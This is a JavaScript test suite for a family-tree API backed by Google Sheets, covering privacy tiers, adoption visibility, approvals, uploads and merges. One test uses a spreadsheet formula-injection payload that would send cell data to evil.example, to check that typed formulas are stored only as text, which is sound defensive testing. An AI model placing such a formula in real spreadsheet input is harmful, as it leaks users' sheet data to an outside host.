// Tests for the Roots API. Run: node apps-script/test/run.js
const assert = require('assert');
const { makeEnv } = require('./harness');

let passed = 0;
const failures = [];
function test(name, fn) {
  try { fn(); passed++; console.log('  ok  ' + name); }
  catch (e) { failures.push(name); console.log('  FAIL ' + name + '\n       ' + (e.stack || e).split('\n').slice(0, 3).join('\n       ')); }
}

const TOK_JONNY = 'jonnyDeviceToken_aaaaaaaaaaaaa';
const TOK_LINDA = 'lindaDeviceToken_bbbbbbbbbbbbb';
const TOK_STRANGER = 'strangerToken_cccccccccccccccc';

function setup() {
  const t = makeEnv();
  t.run('setup');
  const key = t.props.ADMIN_KEY;
  // Jonny seeds the core family with the admin key: auto-approved.
  const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: [
    { kind: 'person', ref: 'new:me', data: { first_name: 'Jonny', birth_surname: 'Ruzicka', living: 'living', birth_date: 'exact:1975-04-02', notes: 'JONNY-PRIVATE-NOTE' } },
    { kind: 'person', ref: 'new:mom', data: { first_name: 'Carol', middle_name: 'Ann', birth_surname: 'Maidenly', married_names: ['Ruzicka'], living: 'living',
      birth_date: 'exact:1950-01-01', birth_place: 'Cleveland, Ohio', notes: 'MOM-PRIVATE-NOTE', nicknames: 'Cee', sex: 'female' } },
    { kind: 'person', ref: 'new:gpa', data: { first_name: 'Josef', birth_surname: 'Ruzicka', living: 'deceased', birth_date: 'about:1920',
      death_date: 'exact:1990-06-01', notes: 'Worked the rail yards', sex: 'male' }, source: 'family Bible' },
    { kind: 'person', ref: 'new:kid', data: { first_name: 'Sam', birth_surname: 'Ruzicka', living: 'living' } },
    { kind: 'relationship', type: 'parent_child', a: 'new:mom', b: 'new:me' },
    { kind: 'relationship', type: 'parent_child', a: 'new:gpa', b: 'new:mom' },
    { kind: 'relationship', type: 'parent_child', a: 'new:me', b: 'new:kid', subtype: 'adopted' },
    { kind: 'claim', person: 'new:me' }
  ] });
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  return { t, key, ids: r.ids };
}

console.log('Roots API tests');

test('admin seed is approved immediately and sets the owner', () => {
  const { t, ids } = setup();
  const tree = t.get({ action: 'tree' });
  assert.strictEqual(tree.people.length, 4);
  assert.strictEqual(tree.relationships.length, 3);
  assert.strictEqual(tree.meta.owner_person_id, ids['new:me']);
});

test('public view of a living person: names, maiden name, gender, birth year, source; nothing else', () => {
  const { t, ids } = setup();
  const tree = t.get({ action: 'tree' });
  assert.strictEqual(tree.meta.view, 'public');
  const mom = tree.people.find(p => p.id === ids['new:mom']);
  assert.deepStrictEqual(Object.keys(mom).sort(), ['added_by', 'birth_date', 'birth_surname', 'first_name', 'id', 'is_placeholder',
    'last_name', 'living', 'married_names', 'middle_name', 'nicknames', 'sex', 'source'].sort());
  assert.strictEqual(mom.last_name, 'Ruzicka');
  assert.strictEqual(mom.birth_surname, 'Maidenly');
  assert.strictEqual(mom.sex, 'female');
  assert.strictEqual(mom.birth_date, 'exact:1950');
});

test('no family-only value appears anywhere in the public response', () => {
  const { t } = setup();
  const raw = JSON.stringify(t.get({ action: 'tree' }));
  for (const secret of ['MOM-PRIVATE-NOTE', 'JONNY-PRIVATE-NOTE', 'Cleveland', '1950-01', '1975-04', 'adopted',
    TOK_JONNY, 'C-', 'merge_log', 'token', 'adoption_shown', 'living_raw']) {
    assert.ok(!raw.includes(secret), 'leaked: ' + secret);
  }
});

test('family view: an approved "this is me" sees living birthdays, places and notes, but not adoption', () => {
  const { t, ids } = setup();
  const tree = t.post({ action: 'tree', token: TOK_JONNY });   // Jonny's claim was approved with the seed; no key sent
  assert.strictEqual(tree.meta.view, 'family');
  const mom = tree.people.find(p => p.id === ids['new:mom']);
  assert.strictEqual(mom.birth_date, 'exact:1950-01-01');
  assert.strictEqual(mom.birth_place, 'Cleveland, Ohio');
  assert.strictEqual(mom.notes, 'MOM-PRIVATE-NOTE');
  assert.strictEqual(mom.living_raw, undefined);
  assert.strictEqual(tree.relationships.find(r => r.b === ids['new:kid']).subtype, 'parent');
});

test('a pending claim still gets the public view; approving it opens the family view', () => {
  const { t, key, ids } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'claim', person: ids['new:kid'] }] });
  assert.strictEqual(t.post({ action: 'tree', token: TOK_LINDA }).meta.view, 'public');
  const q = t.post({ action: 'admin_queue', key });
  t.post({ action: 'admin_approve', key, items: q.batches[0].items.map(i => ({ kind: i.kind, id: i.row.id })) });
  assert.strictEqual(t.post({ action: 'tree', token: TOK_LINDA }).meta.view, 'family');
});

test('owner view: the key on the tree call returns every field, including adoption', () => {
  const { t, key, ids } = setup();
  const tree = t.post({ action: 'tree', key, token: TOK_JONNY });
  assert.strictEqual(tree.meta.view, 'owner');
  const me = tree.people.find(p => p.id === ids['new:me']);
  assert.strictEqual(me.birth_date, 'exact:1975-04-02');
  assert.strictEqual(me.notes, 'JONNY-PRIVATE-NOTE');
  assert.strictEqual(tree.relationships.find(r => r.b === ids['new:kid']).subtype, 'adopted');
  assert.strictEqual(t.post({ action: 'tree', key: 'wrong-key-wrong-key-wrong', token: TOK_STRANGER }).meta.view, 'public');
});

test('adoption is the adopted person\'s choice: only they (or the owner) can show it', () => {
  const { t, key, ids } = setup();
  const kid = ids['new:kid'];
  let r = t.post({ action: 'set_adoption_shown', token: TOK_STRANGER, person_id: kid, shown: true });
  assert.strictEqual(r.ok, false);
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'claim', person: kid }] });
  r = t.post({ action: 'set_adoption_shown', token: TOK_LINDA, person_id: kid, shown: true });
  assert.strictEqual(r.ok, false, 'a pending claim cannot choose');
  const q = t.post({ action: 'admin_queue', key });
  t.post({ action: 'admin_approve', key, items: q.batches[0].items.map(i => ({ kind: i.kind, id: i.row.id })) });
  const own = t.post({ action: 'tree', token: TOK_LINDA }).own;
  assert.strictEqual(own.adoption.person_id, kid);
  assert.strictEqual(own.adoption.shown, false);
  assert.strictEqual(own.adoption.links[0].subtype, 'adopted');
  r = t.post({ action: 'set_adoption_shown', token: TOK_LINDA, person_id: kid, shown: true });
  assert.ok(r.ok, JSON.stringify(r));
  assert.strictEqual(t.get({}).relationships.find(x => x.b === kid).subtype, 'adopted');
  r = t.post({ action: 'set_adoption_shown', token: TOK_LINDA, person_id: ids['new:mom'], shown: true });
  assert.strictEqual(r.ok, false, 'not about them');
  t.post({ action: 'set_adoption_shown', key, token: TOK_JONNY, person_id: kid, shown: false });
  assert.strictEqual(t.get({}).relationships.find(x => x.b === kid).subtype, 'parent');
});

test('middle name and nickname are public, even for living people', () => {
  const { t, ids } = setup();
  const mom = t.get({}).people.find(p => p.id === ids['new:mom']);
  assert.strictEqual(mom.living, true);
  assert.strictEqual(mom.middle_name, 'Ann');
  assert.strictEqual(mom.nicknames, 'Cee');
  assert.deepStrictEqual(mom.married_names, ['Ruzicka']);
});

test('former partners (never married) are accepted', () => {
  const { t, ids } = setup();
  const r = t.post({ action: 'submit', key: t.props.ADMIN_KEY, token: TOK_JONNY, items: [
    { kind: 'person', ref: 'new:x', data: { first_name: 'Ex', living: 'living' } },
    { kind: 'relationship', type: 'partner', a: ids['new:mom'], b: 'new:x', subtype: 'former' }] });
  assert.ok(r.ok, JSON.stringify(r));
  assert.ok(t.get({}).relationships.some(x => x.type === 'partner' && x.subtype === 'former'));
});

test('deceased people show everything', () => {
  const { t, ids } = setup();
  const gpa = t.get({}).people.find(p => p.id === ids['new:gpa']);
  assert.strictEqual(gpa.living, false);
  assert.strictEqual(gpa.notes, 'Worked the rail yards');
  assert.strictEqual(gpa.birth_date, 'about:1920');
  assert.strictEqual(gpa.source, 'family Bible');
  assert.strictEqual(gpa.sex, 'male');
});

test('submitter names follow privacy rules (Jonny shows as first + last)', () => {
  const { t, ids } = setup();
  const gpa = t.get({}).people.find(p => p.id === ids['new:gpa']);
  assert.strictEqual(gpa.added_by, 'Jonny Ruzicka');
});

test('adoption is hidden when the child is living; shown as plain parent', () => {
  const { t, ids } = setup();
  const rel = t.get({}).relationships.find(r => r.b === ids['new:kid']);
  assert.strictEqual(rel.subtype, 'parent');
  assert.ok(!JSON.stringify(t.get({})).includes('adopted'));
});

test('unknown living status: 110-year rule and death date', () => {
  const { t, key } = setup();
  const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: [
    { kind: 'person', ref: 'new:a', data: { first_name: 'Old', birth_date: 'about:1900', notes: 'old-note' } },
    { kind: 'person', ref: 'new:b', data: { first_name: 'Young', birth_date: 'exact:1990', notes: 'young-note' } },
    { kind: 'person', ref: 'new:c', data: { first_name: 'After', birth_date: 'after:1900', notes: 'after-note' } },
    { kind: 'person', ref: 'new:d', data: { first_name: 'Dead', death_date: 'exact:2001', notes: 'dead-note' } },
    { kind: 'person', ref: 'new:e', data: { first_name: 'Plain', notes: 'plain-note' } }
  ] });
  const ppl = t.get({}).people;
  const by = n => ppl.find(p => p.first_name === n);
  assert.strictEqual(by('Old').living, false);
  assert.strictEqual(by('Young').living, true);
  assert.strictEqual(by('After').living, true);
  assert.strictEqual(by('Dead').living, false);
  assert.strictEqual(by('Plain').living, true);
  const raw = JSON.stringify(ppl);
  assert.ok(!raw.includes('young-note') && !raw.includes('after-note') && !raw.includes('plain-note'));
  assert.ok(raw.includes('old-note') && raw.includes('dead-note'));
  assert.ok(r.ok);
});

test('relative submissions are pending: invisible to others, visible to the submitter', () => {
  const { t, ids } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, display_name: 'Linda, Carol\'s cousin', items: [
    { kind: 'person', ref: 'new:aunt', data: { first_name: 'Vera', birth_surname: 'Ruzicka', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:aunt' }
  ] });
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.strictEqual(r.status, 'pending');
  const anon = t.get({});
  assert.ok(!JSON.stringify(anon).includes('Vera'));
  assert.ok(!anon.own);
  const stranger = t.get({ token: TOK_STRANGER });
  assert.ok(!JSON.stringify(stranger).includes('Vera'));
  const linda = t.get({ token: TOK_LINDA });
  assert.strictEqual(linda.own.people.length, 1);
  assert.strictEqual(linda.own.people[0].first_name, 'Vera');
  assert.strictEqual(linda.own.relationships.length, 1);
  assert.strictEqual(t.props.NOTIFY_PENDING, '1');
});

test('a relative cannot link to someone else\'s pending person', () => {
  const { t } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', ref: 'new:x', data: { first_name: 'Hidden' } }] });
  const res = t.post({ action: 'submit', token: TOK_STRANGER, items: [
    { kind: 'person', ref: 'new:y', data: { first_name: 'Probe' } },
    { kind: 'relationship', type: 'partner', a: 'new:y', b: r.ids['new:x'] }
  ] });
  assert.strictEqual(res.ok, false);
  // and nothing from the failed batch was written
  assert.ok(!JSON.stringify(t.sheets.People._data).includes('Probe'));
});

test('typed formulas never reach the Sheet as formulas', () => {
  const { t } = setup();
  const evil = '=IMPORTXML("https://evil.example/?"&A1,"//x")';
  const r = t.post({ action: 'submit', token: TOK_LINDA, display_name: '=HYPERLINK("x")', items: [
    { kind: 'person', data: { first_name: evil, notes: '+1+1', birth_place: '@here' }, source: "-'quoted" }
  ] });
  assert.ok(r.ok, JSON.stringify(r));
  assert.deepStrictEqual(t.formulaWrites, []);
  const own = t.get({ token: TOK_LINDA }).own.people[0];
  assert.strictEqual(own.first_name, evil);   // stored and read back exactly as typed
  assert.strictEqual(own.notes, '+1+1');
  assert.strictEqual(own.source, "-'quoted");
});

test('approval: people-first ordering lets a person and their link be approved together', () => {
  const { t, key, ids } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [
    { kind: 'person', ref: 'new:aunt', data: { first_name: 'Vera', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:aunt' }
  ] });
  const q = t.post({ action: 'admin_queue', key });
  assert.strictEqual(q.batches.length, 1);
  const items = q.batches[0].items.map(i => ({ kind: i.kind, id: i.row.id })).reverse(); // link first on purpose
  const d = t.post({ action: 'admin_approve', key, items });
  assert.deepStrictEqual(d.errors, []);
  const tree = t.get({});
  assert.ok(tree.people.some(p => p.first_name === 'Vera'));
  assert.ok(tree.relationships.some(x => x.b === r.ids['new:aunt']));
});

test('admin actions refuse a wrong key', () => {
  const { t } = setup();
  const r = t.post({ action: 'admin_queue', key: 'nope' });
  assert.strictEqual(r.ok, false);
  const r2 = t.post({ action: 'admin_tree' });
  assert.strictEqual(r2.ok, false);
});

test('admin_tree never includes device tokens', () => {
  const { t, key } = setup();
  const raw = JSON.stringify(t.post({ action: 'admin_tree', key }));
  assert.ok(!raw.includes(TOK_JONNY));
});

test('duplicate link is skipped, not doubled', () => {
  const { t, key, ids } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'relationship', type: 'parent_child', a: ids['new:mom'], b: ids['new:me'] }] });
  assert.strictEqual(r.skipped.length, 1);
});

test('own-ancestor loops are refused', () => {
  const { t, ids } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'relationship', type: 'parent_child', a: ids['new:me'], b: ids['new:gpa'] }] });
  assert.strictEqual(r.ok, false);
  assert.ok(/own ancestor/.test(r.error));
});

test('cousin marriage (same ancestor twice) is allowed', () => {
  const { t, key, ids } = setup();
  const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: [
    { kind: 'person', ref: 'new:c1', data: { first_name: 'Cousin1', living: 'deceased' } },
    { kind: 'person', ref: 'new:c2', data: { first_name: 'Cousin2', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:c1' },
    { kind: 'person', ref: 'new:mid', data: { first_name: 'Mid', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:mid' },
    { kind: 'relationship', type: 'parent_child', a: 'new:mid', b: 'new:c2' },
    { kind: 'relationship', type: 'partner', a: 'new:c1', b: 'new:c2', subtype: 'married' }
  ] });
  assert.ok(r.ok, JSON.stringify(r));
});

test('suggestions: approved correction updates the person and keeps both values on record', () => {
  const { t, key, ids } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'suggestion', target_id: ids['new:gpa'], field: 'birth_date', value: 'exact:1921-03-02', source: 'his draft card' }] });
  const q = t.post({ action: 'admin_queue', key });
  const s = q.batches[0].items[0];
  assert.strictEqual(s.current_value, 'about:1920');
  t.post({ action: 'admin_approve', key, items: [{ kind: 'suggestion', id: s.row.id }] });
  const tree = t.get({});
  assert.strictEqual(tree.people.find(p => p.id === ids['new:gpa']).birth_date, 'exact:1921-03-02');
  assert.strictEqual(tree.history.length, 1);
  assert.strictEqual(tree.history[0].previous_value, 'about:1920');
  assert.strictEqual(tree.history[0].source, 'his draft card');
});

test('corrections to living people never show in public history', () => {
  const { t, key, ids } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'suggestion', target_id: ids['new:mom'], field: 'birth_place', value: 'Akron, Ohio' }] });
  const q = t.post({ action: 'admin_queue', key });
  t.post({ action: 'admin_approve', key, items: [{ kind: 'suggestion', id: q.batches[0].items[0].row.id }] });
  const raw = JSON.stringify(t.get({}));
  assert.ok(!raw.includes('Akron'));
});

test('photos: pending private, approval publishes, queue flags living people', () => {
  const { t, key, ids } = setup();
  const img = Buffer.from('fakejpegbytes').toString('base64');
  const up = t.post({ action: 'upload_photo', token: TOK_LINDA, image: img, mime: 'image/jpeg', caption: 'Birthday',
    tags: [ids['new:mom'], ids['new:gpa'], ids['new:kid']] });
  assert.ok(up.ok, JSON.stringify(up));
  assert.strictEqual(t.get({}).photos.length, 0);
  const fileId = Object.keys(t.files)[0];
  assert.strictEqual(t.files[fileId].sharing, 'PRIVATE');
  assert.strictEqual(t.get({ token: TOK_LINDA }).own.photos.length, 1);

  const q = t.post({ action: 'admin_queue', key });
  const ph = q.batches[0].items.find(i => i.kind === 'photo');
  assert.deepStrictEqual(ph.living_tagged.map(x => x.id).sort(), [ids['new:mom'], ids['new:kid']].sort());

  t.post({ action: 'admin_approve', key, items: [{ kind: 'photo', id: up.id }] });
  assert.strictEqual(t.files[fileId].sharing, 'ANYONE_WITH_LINK');
  const pub = t.get({}).photos;
  assert.strictEqual(pub.length, 1);
  assert.strictEqual(pub[0].tags.length, 3);

  t.post({ action: 'admin_retract', key, items: [{ kind: 'photo', id: up.id }] });
  assert.strictEqual(t.files[fileId].sharing, 'PRIVATE');
  assert.strictEqual(t.get({}).photos.length, 0);
});

test('photo uploads reject other file types', () => {
  const { t } = setup();
  const r = t.post({ action: 'upload_photo', token: TOK_LINDA, image: 'aGk=', mime: 'text/html' });
  assert.strictEqual(r.ok, false);
  assert.ok(/PDFs work/.test(r.error));
});

test('documents: PDFs accepted as documents; one tagging a living person is family only', () => {
  const { t, key, ids } = setup();
  const pdf = Buffer.from('%PDF-1.4 fake').toString('base64');
  const doc = t.post({ action: 'upload_photo', token: TOK_LINDA, image: pdf, mime: 'application/pdf', caption: 'Birth certificate', tags: [ids['new:mom']] });
  assert.ok(doc.ok, JSON.stringify(doc));
  const gpaDoc = t.post({ action: 'upload_photo', token: TOK_LINDA, image: pdf, mime: 'application/pdf', caption: 'Obituary', tags: [ids['new:gpa']] });
  const scan = t.post({ action: 'upload_photo', token: TOK_LINDA, image: Buffer.from('jpg').toString('base64'), mime: 'image/jpeg', kind: 'document', caption: 'Letter', tags: [ids['new:mom']] });
  const own = t.get({ token: TOK_LINDA }).own.photos;
  assert.deepStrictEqual(own.map(f => f.kind), ['document', 'document', 'document']);
  assert.strictEqual(own[0].mime, 'application/pdf');
  assert.strictEqual(own[0].thumbnail, undefined, 'no Drive call per photo on tree load');
  const q = t.post({ action: 'admin_queue', key });
  const qp = q.batches.flatMap(b => b.items).filter(i => i.kind === 'photo');
  assert.strictEqual(qp.length, 3, 'queue items keep kind "photo"');
  assert.ok(qp.every(i => i.photo_kind === 'document'));
  t.post({ action: 'admin_approve', key, items: [doc, gpaDoc, scan].map(x => ({ kind: 'photo', id: x.id })) });
  const pub = t.get({}).photos;
  assert.deepStrictEqual(pub.map(f => f.caption), ['Obituary'], 'documents of living people stay off the public view');
  const fam = t.post({ action: 'tree', token: TOK_JONNY }).photos;
  assert.strictEqual(fam.length, 3);
  assert.strictEqual(fam.find(f => f.caption === 'Birth certificate').mime, 'application/pdf');
  const prev = t.post({ action: 'admin_photo', key, id: doc.id });
  assert.ok(prev.preview && /^data:image/.test(prev.data_url), 'a PDF previews as Drive\'s picture of it');
});

test('photo details: a relative suggests, Jonny approves; the owner applies at once; own pending edits in place', () => {
  const { t, key, ids } = setup();
  const img = Buffer.from('x').toString('base64');
  const up = t.post({ action: 'upload_photo', token: TOK_JONNY, key, image: img, mime: 'image/jpeg', tags: [ids['new:gpa']] });
  // relative suggests a caption and date on an approved photo
  let r = t.post({ action: 'submit', token: TOK_LINDA, items: [
    { kind: 'suggestion', target_id: up.id, field: 'caption', value: 'Grandpa at the rail yard' },
    { kind: 'suggestion', target_id: up.id, field: 'date_taken', value: 'about:1955' }] });
  assert.ok(r.ok, JSON.stringify(r));
  assert.strictEqual(t.get({}).photos[0].caption, '', 'not public until approved');
  assert.strictEqual(t.get({ token: TOK_LINDA }).own.suggestions.filter(x => x.target_id === up.id).length, 2);
  const q = t.post({ action: 'admin_queue', key });
  const items = q.batches.flatMap(b => b.items).filter(i => i.kind === 'suggestion');
  assert.ok(items.every(i => /a photo with no caption/.test(i.target_label)), items.map(i => i.target_label).join());
  t.post({ action: 'admin_approve', key, items: items.map(i => ({ kind: 'suggestion', id: i.row.id })) });
  const ph = t.get({}).photos[0];
  assert.strictEqual(ph.caption, 'Grandpa at the rail yard');
  assert.strictEqual(ph.date_taken, 'about:1955');
  // owner: applies at once, kind too
  r = t.post({ action: 'submit', token: TOK_JONNY, key, items: [{ kind: 'suggestion', target_id: up.id, field: 'kind', value: 'document' }] });
  assert.ok(r.ok, JSON.stringify(r));
  assert.strictEqual(t.get({}).photos[0].kind, 'document');
  r = t.post({ action: 'submit', token: TOK_JONNY, key, items: [{ kind: 'suggestion', target_id: up.id, field: 'kind', value: 'painting' }] });
  assert.strictEqual(r.ok, false);
  // a relative's own pending upload: edit in place
  const mine = t.post({ action: 'upload_photo', token: TOK_LINDA, image: img, mime: 'image/jpeg' });
  r = t.post({ action: 'own_edit', token: TOK_LINDA, id: mine.id, data: { caption: 'Lake, 1985', date_taken: 'exact:1985', place: 'Big Bear' } });
  assert.ok(r.ok, JSON.stringify(r));
  const own = t.get({ token: TOK_LINDA }).own.photos.find(f => f.id === mine.id);
  assert.strictEqual(own.caption, 'Lake, 1985'); assert.strictEqual(own.place, 'Big Bear');
  // nobody else can edit it in place, nor suggest on it while pending
  assert.strictEqual(t.post({ action: 'own_edit', token: TOK_STRANGER, id: mine.id, data: { caption: 'x' } }).ok, false);
  assert.strictEqual(t.post({ action: 'submit', token: TOK_STRANGER, items: [{ kind: 'suggestion', target_id: mine.id, field: 'caption', value: 'x' }] }).ok, false);
});

test('own_thumb: only your own pending photo', () => {
  const { t } = setup();
  const up = t.post({ action: 'upload_photo', token: TOK_LINDA, image: Buffer.from('x').toString('base64'), mime: 'image/jpeg' });
  assert.ok(/^data:image/.test(t.post({ action: 'own_thumb', token: TOK_LINDA, id: up.id }).thumbnail));
  assert.strictEqual(t.post({ action: 'own_thumb', token: TOK_STRANGER, id: up.id }).ok, false);
});

test('merge folds a duplicate in, and unmerge restores the exact prior state', () => {
  const { t, key, ids } = setup();
  const sub = t.post({ action: 'submit', token: TOK_LINDA, items: [
    { kind: 'person', ref: 'new:dup', data: { first_name: 'Josef', birth_surname: 'Ruzicka', living: 'deceased', birth_place: 'Brno' } },
    { kind: 'person', ref: 'new:son', data: { first_name: 'Karel', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: 'new:dup', b: 'new:son' },
    { kind: 'relationship', type: 'parent_child', a: 'new:dup', b: ids['new:mom'] }   // duplicates an existing link after merge
  ] });
  const q = t.post({ action: 'admin_queue', key });
  const dupItem = q.batches[0].items.find(i => i.kind === 'person' && i.row.first_name === 'Josef');
  assert.strictEqual(dupItem.possible_duplicates[0].id, ids['new:gpa']);
  t.post({ action: 'admin_approve', key, items: q.batches[0].items.map(i => ({ kind: i.kind, id: i.row.id })) });

  const snapshot = name => JSON.stringify(t.sheets[name]._data);
  const before = ['People', 'Relationships', 'PhotoTags', 'Suggestions', 'Contributors'].map(snapshot);

  const m = t.post({ action: 'admin_merge', key, keep: ids['new:gpa'], drop: sub.ids['new:dup'] });
  assert.ok(m.ok, JSON.stringify(m));
  const tree = t.get({});
  assert.ok(!tree.people.some(p => p.id === sub.ids['new:dup']));
  const gpa = tree.people.find(p => p.id === ids['new:gpa']);
  assert.strictEqual(gpa.birth_place, 'Brno');                  // blank filled from the duplicate
  assert.ok(tree.relationships.some(r => r.a === ids['new:gpa'] && r.b === sub.ids['new:son']));
  const toMom = tree.relationships.filter(r => r.b === ids['new:mom']);
  assert.strictEqual(toMom.length, 1);                           // duplicate link collapsed

  // a later submission pointing at the merged id lands on the survivor
  const late = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'suggestion', target_id: sub.ids['new:dup'], field: 'notes', value: 'x' }] });
  assert.ok(late.ok, JSON.stringify(late));

  t.post({ action: 'admin_unmerge', key, id: sub.ids['new:dup'] });
  const after = ['People', 'Relationships', 'PhotoTags', 'Suggestions', 'Contributors'].map(snapshot);
  // Everything except the reviewed_at stamp on the dropped person and the later suggestion is back.
  const strip = s => s.replace(/"20\d\d-[^"]*Z"/g, '"T"');
  assert.strictEqual(strip(after[1]), strip(before[1]));
  const peopleBefore = JSON.parse(strip(before[0]));
  const peopleAfter = JSON.parse(strip(after[0]));
  assert.deepStrictEqual(peopleAfter, peopleBefore);
});

test('pause stops relatives but not the admin', () => {
  const { t, key } = setup();
  t.post({ action: 'admin_pause', key, paused: true });
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'X' } }] });
  assert.strictEqual(r.ok, false);
  const r2 = t.post({ action: 'submit', key, token: TOK_JONNY, items: [{ kind: 'person', data: { first_name: 'Y' } }] });
  assert.ok(r2.ok);
  assert.strictEqual(t.get({}).meta.paused, true);
});

test('daily cap per contributor', () => {
  const { t } = setup();
  let last;
  for (let i = 0; i < 6; i++) {
    last = t.post({ action: 'submit', token: TOK_LINDA, items: Array.from({ length: 60 }, (_, j) => ({ kind: 'person', data: { first_name: 'P' + i + '_' + j } })) });
  }
  assert.strictEqual(last.ok, false);
  assert.ok(/a lot for one day/.test(last.error));
});

test('writes past row 1000 grow the sheet instead of crashing', () => {
  const { t, key } = setup();
  for (let i = 0; i < 17; i++) {
    const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: Array.from({ length: 60 }, (_, j) => ({ kind: 'person', data: { first_name: 'N' + i + '_' + j } })) });
    assert.ok(r.ok, JSON.stringify(r));
  }
  assert.ok(t.get({}).people.length > 1000);
});

test('bad dates and empty names are refused with a readable message', () => {
  const { t } = setup();
  const a = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'A', birth_date: 'March-ish' } }] });
  assert.strictEqual(a.ok, false);
  assert.ok(/birth date/.test(a.error));
  const b = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { notes: 'no name' } }] });
  assert.strictEqual(b.ok, false);
  const c = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { is_placeholder: true } }] });
  assert.ok(c.ok, 'placeholders need no name');
  const d = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'Dated', birth_date: { year: 1932, qualifier: 'about' } } }] });
  assert.ok(d.ok);
  assert.strictEqual(t.get({ token: TOK_LINDA }).own.people.find(p => p.first_name === 'Dated').birth_date, 'about:1932');
});

test('a pending "this is me" claim shows no name until approved', () => {
  const { t, key, ids } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [
    { kind: 'person', ref: 'new:me', data: { first_name: 'Linda', birth_surname: 'Novak', living: 'living' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:me' },
    { kind: 'claim', person: 'new:me' },
    { kind: 'person', ref: 'new:x', data: { first_name: 'Otto', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:x' }
  ] });
  const q = t.post({ action: 'admin_queue', key });
  const all = q.batches.flatMap(b => b.items.map(i => ({ kind: i.kind, id: i.row.id })));
  const noClaim = all.filter(i => i.kind !== 'claim');
  t.post({ action: 'admin_approve', key, items: noClaim });
  let otto = t.get({}).people.find(p => p.first_name === 'Otto');
  assert.strictEqual(otto.added_by, null);
  t.post({ action: 'admin_approve', key, items: all.filter(i => i.kind === 'claim') });
  otto = t.get({}).people.find(p => p.first_name === 'Otto');
  assert.strictEqual(otto.added_by, 'Linda Novak');
});

test('email digest: one email for a burst, none when quiet', () => {
  const { t } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'A' } }] });
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'B' } }] });
  t.run('notifyDigest');
  t.run('notifyDigest');
  assert.strictEqual(t.mails.length, 1);
  assert.ok(/2 waiting/.test(t.mails[0].subject));
});

test('a relative can report a wrong link; approving takes it off the tree, both people stay', () => {
  const { t, key, ids } = setup();
  const link = t.post({ action: 'admin_tree', key }).Relationships.find(r => r.person_a === ids['new:gpa'] && r.person_b === ids['new:mom']);
  const r = t.post({ action: 'submit', token: TOK_LINDA, display_name: 'Linda', items: [{ kind: 'suggestion', target_id: link.id, field: 'remove', value: 'removed', source: 'Josef was her uncle' }] });
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  const q = t.post({ action: 'admin_queue', key });
  const item = q.batches.flatMap(b => b.items).find(i => i.kind === 'suggestion');
  assert.strictEqual(item.row.field, 'remove');
  assert.ok(/Josef.*as the parent of.*Carol/.test(item.target_label), item.target_label);
  let pub = t.get({});
  assert.ok(pub.relationships.some(x => x.a === ids['new:gpa'] && x.b === ids['new:mom']), 'still public while pending');
  const a = t.post({ action: 'admin_approve', key, items: [{ kind: 'suggestion', id: item.row.id }] });
  assert.deepStrictEqual(a.errors, []);
  pub = t.get({});
  assert.ok(!pub.relationships.some(x => x.a === ids['new:gpa'] && x.b === ids['new:mom']), 'link gone once approved');
  assert.ok(pub.people.some(p => p.id === ids['new:gpa']) && pub.people.some(p => p.id === ids['new:mom']), 'both people stay');
  const row = t.post({ action: 'admin_tree', key }).Suggestions.find(s => s.id === item.row.id);
  assert.strictEqual(JSON.parse(row.previous_value), 'approved');
});

test('the owner removing a link applies at once; a person cannot be "removed" this way', () => {
  const { t, key, ids } = setup();
  const link = t.post({ action: 'admin_tree', key }).Relationships.find(r => r.person_a === ids['new:me'] && r.person_b === ids['new:kid']);
  const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: [{ kind: 'suggestion', target_id: link.id, field: 'remove', value: 'removed' }] });
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.ok(!t.get({}).relationships.some(x => x.a === ids['new:me'] && x.b === ids['new:kid']));
  const bad = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'suggestion', target_id: ids['new:kid'], field: 'remove', value: 'removed' }] });
  assert.strictEqual(bad.ok, false);
  assert.ok(/only a link/.test(bad.error), bad.error);
});

test('daily backup: one copy a day of every tab, in a backups folder, newest 30 kept', () => {
  const { t } = setup();
  t.run('notifyDigest');
  const folders = Object.values(t.drive.folders).filter(f => f.name === 'Roots backups');
  assert.strictEqual(folders.length, 1);
